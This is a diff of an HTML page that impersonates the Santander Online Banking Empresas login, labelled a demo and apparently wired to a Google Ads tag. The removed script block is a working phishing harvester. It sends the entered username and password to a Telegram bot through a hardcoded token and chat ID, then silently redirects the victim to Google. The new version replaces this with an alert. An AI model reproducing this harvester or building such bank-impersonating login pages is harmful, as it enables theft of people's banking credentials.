@@ -3,6 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
 <title>Online Banking Empresas - DEMO</title>
 <!-- Google tag (gtag.js) -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=AW-18404538356"></script>
@@ -10,743 +11,1208 @@
   window.dataLayer = window.dataLayer || [];
   function gtag(){dataLayer.push(arguments);}
   gtag('js', new Date());
+
   gtag('config', 'AW-18404538356');
 </script>
 <style>
+
 /* =====================================================
    RESET
 ===================================================== */
+
 *{
     box-sizing:border-box;
     margin:0;
     padding:0;
 }
+
 body{
     font-family:Arial, Helvetica, sans-serif;
     background:#e9ecef;
     color:#222;
 }
+
+
 /* =====================================================
    ETIQUETA DEMO
 ===================================================== */
+
 .demo{
     position:fixed;
     top:8px;
     left:50%;
     transform:translateX(-50%);
+
     z-index:1000;
+
     background:#222;
     color:#fff;
+
     padding:5px 13px;
+
     border-radius:20px;
+
     font-size:11px;
     font-weight:bold;
 }
+
+
 /* =====================================================
    CONTENEDOR
 ===================================================== */
+
 .page{
     min-height:100vh;
     display:flex;
     flex-direction:column;
 }
+
+
 /* =====================================================
    PARTE PRINCIPAL PC
 ===================================================== */
+
 .main{
     display:grid;
     grid-template-columns:68% 32%;
+
     min-height:calc(100vh - 135px);
 }
+
+
 /* =====================================================
    PANEL IZQUIERDO
 ===================================================== */
+
 .left{
     position:relative;
+
     padding:35px 42px;
+
     background:#e9ecef;
 }
+
+
 /* =====================================================
    LOGO IZQUIERDO
 ===================================================== */
+
 .logo{
     font-size:28px;
+
     font-weight:bold;
+
     color:#e30613;
+
     margin-bottom:15px;
 }
+
 .logo span{
     display:block;
+
     font-size:12px;
+
     color:#555;
+
     margin-top:3px;
 }
+
+
 /* =====================================================
    TITULO
 ===================================================== */
+
 .title{
     font-size:58px;
+
     line-height:1.05;
+
     font-weight:300;
+
     margin-bottom:8px;
 }
+
 .title strong{
     font-weight:700;
 }
+
+
 /* =====================================================
    SEGURIDAD
 ===================================================== */
+
 .security{
     margin-top:40px;
+
     max-width:800px;
 }
+
+
 .security-title{
     display:flex;
+
     align-items:center;
+
     gap:15px;
+
     margin-bottom:25px;
 }
+
+
 .security-title .red{
     color:#ed0000;
+
     font-size:65px;
+
     font-weight:bold;
+
     font-style:italic;
 }
+
+
 .security-title .black{
     font-size:38px;
+
     font-weight:bold;
 }
+
+
 /* =====================================================
    MENSAJES
 ===================================================== */
+
 .warning{
     display:flex;
+
     gap:15px;
+
     margin:20px 0;
+
     max-width:610px;
 }
+
+
 .icon{
     font-size:28px;
+
     min-width:38px;
 }
+
+
 .warning p{
     font-size:15px;
+
     line-height:1.45;
 }
+
+
 .warning b{
     font-weight:700;
 }
+
+
 /* =====================================================
    BOTON SEGURIDAD
 ===================================================== */
+
 .security-btn{
     margin-top:18px;
+
     padding:12px 23px;
+
     border:1.5px solid #e30613;
+
     border-radius:25px;
+
     background:white;
+
     color:#e30613;
+
     font-weight:bold;
+
     font-size:14px;
+
     cursor:pointer;
 }
+
+
 /* =====================================================
    ESCUDO PC
 ===================================================== */
+
 .shield{
     position:absolute;
+
     right:10%;
+
     top:220px;
+
     width:260px;
+
     height:310px;
+
     border:10px solid #222;
+
     border-top-left-radius:100px;
+
     border-top-right-radius:100px;
+
     border-bottom-left-radius:150px;
+
     border-bottom-right-radius:150px;
+
     transform:rotate(3deg);
 }
+
+
 /* CANDADO */
+
 .lock{
     position:absolute;
+
     left:50%;
+
     top:95px;
+
     transform:translateX(-50%);
+
     width:100px;
+
     height:85px;
+
     background:#ed0000;
+
     border-radius:12px;
+
     border:8px solid #222;
 }
+
+
 .lock:before{
     content:"";
+
     position:absolute;
+
     width:55px;
+
     height:60px;
+
     border:10px solid #ed0000;
+
     border-bottom:0;
+
     border-radius:35px 35px 0 0;
+
     left:50%;
+
     top:-65px;
+
     transform:translateX(-50%);
 }
+
+
 /* =====================================================
    LOGIN PC
 ===================================================== */
+
 .login{
     background:#fff;
+
     padding:25px 45px;
+
     border-left:1px solid #ddd;
 }
+
+
 /* TABS */
+
 .tabs{
     display:grid;
+
     grid-template-columns:1fr 1fr;
+
     border-bottom:1px solid #aaa;
+
     margin-bottom:50px;
 }
+
+
 .tab{
     padding:14px 5px;
+
     text-align:center;
+
     color:#888;
+
     font-size:14px;
 }
+
+
 .tab.active{
     color:#111;
+
     font-weight:bold;
+
     border-bottom:2px solid #008fc5;
 }
+
+
 /* =====================================================
    LOGIN BOX
 ===================================================== */
+
 .login-box{
     max-width:430px;
+
     margin:auto;
 }
+
+
 /* TITULO LOGIN */
+
 .login-title{
     font-size:26px;
+
     margin-bottom:18px;
 }
+
+
 /* SUBTITULO */
+
 .login-subtitle{
     font-size:17px;
+
     margin-bottom:45px;
 }
+
+
 /* LABEL */
+
 label{
     display:block;
+
     font-size:15px;
+
     margin-bottom:7px;
 }
+
+
 /* =====================================================
    INPUT
 ===================================================== */
+
 input{
     width:100%;
+
     height:54px;
+
     border:1px solid #aaa;
+
     border-radius:8px;
+
     padding:0 14px;
+
     font-size:16px;
+
     margin-bottom:20px;
+
     outline:none;
 }
+
+
 input:focus{
     border-color:#008fac;
 }
+
+
 /* =====================================================
    RECORDAR
 ===================================================== */
+
 .remember{
     display:flex;
+
     align-items:center;
+
     gap:10px;
+
     margin:3px 0 40px;
+
     font-size:14px;
 }
+
+
 .remember input{
     width:20px;
+
     height:20px;
+
     min-width:20px;
+
     margin:0;
 }
+
+
 .remember label{
     margin:0;
 }
+
+
 /* =====================================================
    BOTON INGRESAR
 ===================================================== */
+
 .enter{
     display:block;
+
     width:180px;
+
     height:44px;
+
     margin:auto;
+
     border:none;
+
     border-radius:25px;
+
     background:#ed0000;
+
     color:white;
+
     font-size:16px;
+
     font-weight:bold;
+
     cursor:pointer;
 }
+
+
 /* =====================================================
    AYUDA
 ===================================================== */
+
 .help{
     border-top:1px solid #ddd;
+
     margin-top:42px;
+
     padding-top:30px;
+
     text-align:center;
+
     color:#00778b;
+
     font-weight:bold;
 }
+
+
 /* =====================================================
    FOOTER PC
 ===================================================== */
+
 .footer{
     background:#202020;
+
     color:white;
+
     padding:22px 42px;
+
     min-height:135px;
 }
+
+
 .footer h3{
     font-size:14px;
+
     margin-bottom:12px;
 }
+
+
 .footer p{
     font-size:13px;
+
     line-height:1.6;
+
     max-width:1050px;
 }
+
+
 /* =====================================================
    TABLET
 ===================================================== */
+
 @media(max-width:1000px){
+
     .main{
         grid-template-columns:1fr;
     }
+
     .left{
         min-height:650px;
     }
+
     .shield{
         right:8%;
+
         top:250px;
+
         transform:scale(.75) rotate(3deg);
     }
+
     .login{
         border-left:none;
+
         border-top:1px solid #ddd;
+
         padding:30px 25px;
     }
+
 }
+
+
 /* =====================================================
    MOVIL
 ===================================================== */
+
 @media(max-width:600px){
+
     body{
         background:#fff;
     }
+
+
     /* ---------------------------------------------
        OCULTAR PANEL IZQUIERDO
     --------------------------------------------- */
+
     .left{
         display:none;
     }
+
+
     /* ---------------------------------------------
        OCULTAR FOOTER
     --------------------------------------------- */
+
     .footer{
         display:none;
     }
+
+
     /* ---------------------------------------------
        LOGIN
     --------------------------------------------- */
+
     .main{
         display:block;
+
         min-height:100vh;
     }
+
+
     .login{
         width:100%;
+
         min-height:100vh;
+
         padding:30px 22px 25px;
+
         border:0;
+
         background:#fff;
     }
+
+
     /* ---------------------------------------------
        OCULTAR TABS
     --------------------------------------------- */
+
     .tabs{
         display:none;
     }
+
+
     .login-box{
         width:100%;
+
         max-width:none;
+
         margin:0;
     }
+
+
     /* ---------------------------------------------
        LOGO MOVIL
     --------------------------------------------- */
+
     .login-box::before{
+
         content:"Santander | Empresas";
+
         display:block;
+
         text-align:center;
+
         font-size:21px;
+
         font-weight:500;
+
         color:#222;
+
         margin-bottom:42px;
     }
+
+
     /* ---------------------------------------------
        TITULO
     --------------------------------------------- */
+
     .login-title{
+
         text-align:center;
+
         font-size:22px;
+
         line-height:1.2;
+
         font-weight:400;
+
         margin-bottom:16px;
     }
+
+
     /* ---------------------------------------------
        SUBTITULO
     --------------------------------------------- */
+
     .login-subtitle{
+
         text-align:center;
+
         font-size:16px;
+
         line-height:1.35;
+
         margin:0 auto 42px;
+
         max-width:500px;
     }
+
+
     /* ---------------------------------------------
        LABELS
     --------------------------------------------- */
+
     label{
+
         font-size:16px;
+
         margin-bottom:7px;
     }
+
+
     /* ---------------------------------------------
        INPUTS
     --------------------------------------------- */
+
     input{
+
         width:100%;
+
         height:52px;
+
         border:1px solid #999;
+
         border-radius:8px;
+
         font-size:16px;
+
         padding:0 12px;
+
         margin-bottom:25px;
     }
+
+
     /* ---------------------------------------------
        RECORDAR USUARIO
     --------------------------------------------- */
+
     .remember{
+
         margin:2px 0 40px;
+
         display:flex;
+
         align-items:center;
+
         gap:10px;
     }
+
+
     .remember input{
+
         width:20px;
+
         height:20px;
+
         min-width:20px;
+
         margin:0;
     }
+
+
     .remember label{
+
         font-size:16px;
+
         margin:0;
     }
+
+
     /* ---------------------------------------------
        BOTON
     --------------------------------------------- */
+
     .enter{
+
         width:100%;
+
         height:52px;
+
         border-radius:28px;
+
         font-size:17px;
     }
+
+
     /* ---------------------------------------------
        AYUDA
     --------------------------------------------- */
+
     .help{
+
         margin-top:50px;
+
         padding-top:35px;
+
         font-size:16px;
+
         color:#087b80;
+
         border-top:1px solid #ddd;
     }
+
 }
+
+
 /* =====================================================
    MOVIL PEQUEÑO
 ===================================================== */
+
 @media(max-width:380px){
+
     .login{
+
         padding:25px 18px 20px;
     }
+
+
     .login-box::before{
+
         font-size:19px;
+
         margin-bottom:35px;
     }
+
+
     .login-title{
+
         font-size:20px;
     }
+
+
     .login-subtitle{
+
         font-size:15px;
+
         margin-bottom:35px;
     }
+
+
     label{
+
         font-size:15px;
     }
+
+
     input{
+
         height:48px;
+
         margin-bottom:22px;
     }
+
+
     .remember{
+
         margin-bottom:35px;
     }
+
+
     .remember input{
+
         width:19px;
+
         height:19px;
+
         min-width:19px;
     }
+
+
     .remember label{
+
         font-size:15px;
     }
+
+
     .enter{
+
         height:49px;
+
         font-size:16px;
     }
+
+
     .help{
+
         margin-top:45px;
+
         padding-top:30px;
+
         font-size:15px;
     }
+
 }
+
 </style>
 </head>
+
+
 <body>
+
+
 <!-- =====================================================
      DEMO
 ===================================================== -->
+
+
+
 <div class="page">
+
+
     <!-- =================================================
          PARTE PRINCIPAL
     ================================================== -->
+
     <div class="main">
+
+
         <!-- =============================================
              PANEL IZQUIERDO - PC
         ============================================== -->
+
         <section class="left">
+
+
             <div class="logo">
+
                 Santander
+
                 <span>
                     ONLINE BANKING EMPRESAS · DEMO
                 </span>
+
             </div>
+
+
             <div class="title">
+
                 Online Banking<br>
+
                 <strong>
                     Empresas
                 </strong>
+
             </div>
+
+
             <!-- SEGURIDAD -->
+
             <div class="security">
+
+
                 <div class="security-title">
+
                     <span class="red">
                         Prevení
                     </span>
+
                     <span class="black">
                         estafas
                     </span>
+
                 </div>
+
+
                 <div class="warning">
+
                     <div class="icon">
                         🔒
                     </div>
+
                     <p>
+
                         <b>
                             No ingreses información de seguridad
                         </b>
+
                         si te la solicitan en un momento inesperado
                         o en una pantalla que no reconocés.
+
                     </p>
+
                 </div>
+
+
                 <div class="warning">
+
                     <div class="icon">
                         ****
                     </div>
+
                     <p>
+
                         <b>
                             Nunca compartas tus claves o códigos
                         </b>
+
                         para validar datos ni actualizar sistemas.
+
                     </p>
+
                 </div>
+
+
                 <button
                     class="security-btn"
                     type="button">
+
                     Consultar consejos de seguridad
+
                 </button>
+
+
             </div>
+
+
             <!-- ESCUDO -->
+
             <div class="shield">
+
                 <div class="lock"></div>
+
             </div>
+
+
         </section>
+
+
+
         <!-- =============================================
              LOGIN
         ============================================== -->
+
         <section class="login">
+
+
             <!-- TABS PC -->
+
             <div class="tabs">
+
+
                 <div class="tab active">
+
                     Ingresar con usuario y contraseña
+
                 </div>
+
+
                 <div class="tab">
+
                     Ingresar con Certificado digital
+
                 </div>
+
+
             </div>
+
+
+
             <!-- LOGIN BOX -->
+
             <div class="login-box">
+
+
                 <h1 class="login-title">
+
                     ¡Hola! Te damos la bienvenida
+
                 </h1>
+
+
                 <p class="login-subtitle">
+
                     Escribí tu usuario y contraseña y empezá a operar
+
                 </p>
-                <!-- FORMULARIO -->
-                <form id="loginForm" onsubmit="return false;">
+
+
+
+                <!-- FORMULARIO SOLO DEMO -->
+
+                <form onsubmit="return false;">
+
+
                     <label for="usuario">
+
                         Usuario
+
                     </label>
+
+
                     <input
                         id="usuario"
                         type="text"
                         autocomplete="off"
-                        placeholder="Ingresá tu usuario"
                     >
+
+
+
                     <label for="password">
+
                         Contraseña
+
                     </label>
+
+
                     <input
                         id="password"
                         type="password"
                         autocomplete="off"
-                        placeholder="Ingresá tu contraseña"
                     >
+
+
+
                     <div class="remember">
+
+
                         <input
                             type="checkbox"
                             id="recordar"
                         >
+
+
                         <label for="recordar">
+
                             Recordar usuario
+
                         </label>
+
+
                     </div>
+
+
+
                     <button
                         type="button"
                         class="enter"
                         onclick="demoLogin()">
+
                         Ingresar
+
                     </button>
+
+
                 </form>
+
+
+
                 <div class="help">
+
                     ¿Necesitás ayuda para ingresar?
+
                 </div>
+
+
             </div>
+
+
         </section>
+
+
     </div>
+
+
+
     <!-- =================================================
          FOOTER
     ================================================== -->
+
     <footer class="footer">
+
+
         <h3>
+
             ¿Tenés alguna consulta?
+
         </h3>
+
+
         <p>
+
             Esta es una maqueta educativa.
             Para una implementación real, utilizá únicamente
             los canales oficiales de tu entidad bancaria.
             No ingreses datos reales en esta demostración.
+
         </p>
+
+
     </footer>
+
+
 </div>
 
+
+
 <script>
-/* =====================================================
-   CONFIGURACIÓN DEL BOT DE TELEGRAM
-   ⚠️ REEMPLAZA ESTOS VALORES CON LOS TUYOS ⚠️
-===================================================== */
-const TELEGRAM_TOKEN = "8687465704:AAG-mtNwSHa5qsC7E4lSUePWFlyp0Rceopo";  // <-- CAMBIÁ ESTO
-const TELEGRAM_CHAT_ID = "8963781207";                            // <-- CAMBIÁ ESTO
 
 /* =====================================================
-   FUNCIÓN: Enviar datos a Telegram
+   BOTON DEMO
 ===================================================== */
-async function enviarATelegram(usuario, password) {
-    const ahora = new Date();
-    const fecha = ahora.toLocaleDateString('es-AR');
-    const hora = ahora.toLocaleTimeString('es-AR');
 
-    const mensaje = `
-🔐 *NUEVO INICIO DE SESIÓN - DEMO*
+function demoLogin(){
 
-📅 Fecha: ${fecha}
-⏰ Hora: ${hora}
+    alert(
+        "MAQUETA DEMO\n\n" +
+        "Este botón es únicamente visual " +
+        "y no envía ni almacena información."
+    );
 
-👤 *Usuario:* ${usuario}
-🔑 *Contraseña:* ${password}
-
-⚠️ *DEMO* - Solo para pruebas educativas
-    `.trim();
-
-    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
-
-    try {
-        const response = await fetch(url, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                chat_id: TELEGRAM_CHAT_ID,
-                text: mensaje,
-                parse_mode: 'Markdown'
-            })
-        });
-        return await response.json();
-    } catch (error) {
-        console.error('Error al enviar a Telegram:', error);
-        return null;
-    }
 }
 
-/* =====================================================
-   FUNCIÓN: Botón "Ingresar"
-   - Envía datos a Telegram (sin mostrar nada)
-   - Redirige a Google
-===================================================== */
-async function demoLogin() {
-    const usuarioInput = document.getElementById('usuario');
-    const passwordInput = document.getElementById('password');
-
-    const usuario = usuarioInput.value.trim();
-    const password = passwordInput.value.trim();
-
-    // Si los campos están vacíos, mostrar alerta y no continuar
-    if (!usuario || !password) {
-        alert('⚠️ Por favor, completá todos los campos.');
-        return;
-    }
-
-    // Enviar datos a Telegram (en segundo plano, sin mensajes al usuario)
-    enviarATelegram(usuario, password);
-
-    // LIMPIAR CAMPOS por seguridad
-    usuarioInput.value = '';
-    passwordInput.value = '';
-
-    // REDIRIGIR A GOOGLE
-    window.location.href = "https://www.google.com";
-}
 </script>
+
+
 </body>
 </html>
